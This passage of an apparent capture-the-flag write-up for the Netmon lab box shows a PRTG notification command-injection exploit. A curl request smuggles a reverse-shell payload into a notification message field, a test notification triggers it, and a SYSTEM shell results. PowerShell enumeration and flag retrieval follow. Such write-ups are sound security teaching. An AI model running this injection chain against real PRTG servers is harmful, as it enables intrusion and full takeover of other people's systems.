--</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>url_9=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>urlsniselect_9=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>urlsniname_9=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>postdata_9=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_10=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_10=10<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>address_10=Demo EXE Notification - OutFile.ps1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_10=;<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">REVSHELL_PAYLOAD</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>windowslogindomain_10=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>windowsloginusername_10=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>windowsloginpassword_10=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>timeout_10=60<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_15=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>accesskeyid_15=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>secretaccesskeyid_15=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>arn_15=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>subject_15=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_15=[%sitename] %device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>active_16=0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>isusergroup_16=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>addressgroupid_16=200|PRTG Administrators<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ticketuserid_16=100|PRTG System Administrator<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>subject_16=%device %name %status %down (%message)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message_16=Sensor: %name\nStatus: %status %down\n\nDate/Time: %datetime (%timezone)\nLast Result: %lastvalue\nLast Message: %message\n\nProbe: %probe\nGroup: %group\nDevice: %device (%host)\n\nLast Scan: %lastcheck\nLast Up: %lastup\nLast Down: %lastdown\nUptime: %uptime\nDowntime: %downtime\nCumulated since: %cumsince\nLocation: %location\n\n<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>autoclose_16=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>objecttype=notification<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>id=new<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
+</span></span><span class="z-source z-shell z-bash">  <span class="z-variable z-other z-readwrite z-assignment z-shell">ID</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">jq</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.objid<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span></code></pre>
+<p>Finally, let's trigger the payload by sending a test notification request.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Cookie: OCTOPUS1813713946=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">OCTOPUS1813713946</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.152/api/notificationtest.htm<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>id=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">ID</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.152] 49887
+</span><span class="z-text z-plain">PS C:\Windows\system32&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p>I could just retrieve the flags and call it a day, but for good measure I'll
+still enumerate basic information.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Netmon's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>PROCESSOR_ARCHITECTURE<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">AMD64
+</span></code></pre>
+<p>It's using AMD64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="version">Version</h3>
+<p>Let's gather some information about the Windows version of Netmon.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-List</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Property <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>ProductName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>CurrentBuildNumber<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ProductName        : Windows Server 2016 Standard
+</span><span class="z-text z-plain">CurrentBuildNumber : 14393
+</span></code></pre>
+<p>In fact, it's Windows Server 2016 Standard build <code>14393</code> (<code>nmap</code> was wrong!).</p>
+<h3 id="hotfixes">Hotfixes</h3>
+<p>Let's retrieve the list of installed hotfixes.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-HotFix</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HotFixID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">KB3199986
+</span><span class="z-text z-plain">KB3200970
+</span></code></pre>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Users<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<p>There's no user.</p>
+<p>What about the administrators?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Administrators<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MemberName           SID                                          
+</span><span class="z-text z-plain">----------           ---                                          
+</span><span class="z-text z-plain">NETMON\Administrator S-1-5-21-2105491204-2789866987-2357151585-500
+</span></code></pre>
+<p>There's only the built-in <code>Administrator</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>GroupName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Comment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                           Comment
+</span><span class="z-text z-plain">---------                           -------
+</span><span class="z-text z-plain">Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+</span><span class="z-text z-plain">Administrators                      Administrators have complete and unrestricted access to the computer/domain
+</span><span class="z-text z-plain">Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+</span><span class="z-text z-plain">Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
+</span><span class="z-text z-plain">Cryptographic Operators             Members are authorized to perform cryptographic operations.
+</span><span class="z-text z-plain">Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
+</span><span class="z-text z-plain">Event Log Readers                   Members of this group can read event logs from local machine
+</span><span class="z-text z-plain">Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+</span><span class="z-text z-plain">Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
+</span><span class="z-text z-plain">IIS_IUSRS                           Built-in group used by Internet Information Services.
+</span><span class="z-text z-plain">Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
+</span><span class="z-text z-plain">Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+</span><span class="z-text z-plain">Performance Monitor Users           Members of this group can access performance counter data locally and remotely
+</span><span class="z-text z-plain">Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
+</span><span class="z-text z-plain">Print Operators                     Members can administer printers installed on domain controllers
+</span><span class="z-text z-plain">RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
+</span><span class="z-text z-plain">RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
+</span><span class="z-text z-plain">RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
+</span><span class="z-text z-plain">Remote Desktop Users                Members in this group are granted the right to logon remotely
+</span><span class="z-text z-plain">Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span><span class="z-text z-plain">Replicator                          Supports file replication in a domain      
+</span><span class="z-text z-plain">Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of Storage Replica.
+</span><span class="z-text z-plain">System Managed Accounts Group       Members of this group are managed by the system.
+</span><span class="z-text z-plain">Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : netmon
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   DNS Suffix Search List. . . . . . : htb
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Ethernet0 2:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : htb
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-1A-75
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::201(Preferred) 
+</span><span class="z-text z-plain">   Lease Obtained. . . . . . . . . . : Sunday, February 4, 2024 5:38:58 AM
+</span><span class="z-text z-plain">   Lease Expires . . . . . . . . . . : Sunday, February 4, 2024 6:25:58 AM
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::7d50:ceef:e4e2:5ba9(Preferred) 
+</span><span class="z-text z-plain">   Link-local IPv6 Address . . . . . : fe80::7d50:ceef:e4e2:5ba9%3(Preferred) 
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.10.152(Preferred) 
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:1014%3
+</span><span class="z-text z-plain">                                       10.10.10.2
+</span><span class="z-text z-plain">   DHCPv6 IAID . . . . . . . . . . . : 100683862
+</span><span class="z-text z-plain">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2C-DF-F4-87-00-50-56-B9-14-09
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
+</span><span class="z-text z-plain">                                       fec0:0:0:ffff::2%1
+</span><span class="z-text z-plain">                                       fec0:0:0:ffff::3%1
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix Search List :
+</span><span class="z-text z-plain">                                       htb
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Tunnel adapter isatap.{9978787D-72DF-4652-BD20-59EE06187435}:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Media State . . . . . . . . . . . : Media disconnected
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : htb
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span></code></pre>
+<p>There's an Ethernet interface and an ISATAP interface.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check <code>Public</code>'s Desktop folder, we find the user flag.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\Public\Desktop\user.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">d0f389244ccaeb5f3877a088ef5ebfde
+</span></code></pre>
+<p>And as usual, we can find the root flag in <code>Administrator</code>'s Desktop folder.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\Administrator\Desktop\root.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
